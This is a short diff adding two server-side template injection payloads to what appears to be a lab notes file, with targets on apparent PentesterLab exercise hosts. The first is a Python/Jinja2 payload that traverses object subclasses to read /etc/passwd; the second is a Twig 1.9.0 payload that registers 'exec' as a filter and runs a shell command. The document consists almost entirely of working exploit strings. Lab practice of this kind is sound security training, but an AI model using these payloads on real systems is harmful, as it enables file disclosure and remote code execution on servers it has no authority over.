@@ -1,4 +1,8 @@
 
 
-http://ptl-20d72bd5-bb314c9c.libcurl.so/{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}
+1. http://ptl-20d72bd5-bb314c9c.libcurl.so/{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}
 233
+
+2. Older version Twig (1.9.0). :
+
+http://ptl-c4434ddb-351ce969.libcurl.so/?name=hacker?{{_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{_self.env.getFilter(%27/usr/local/bin/score%20-a%27)}}
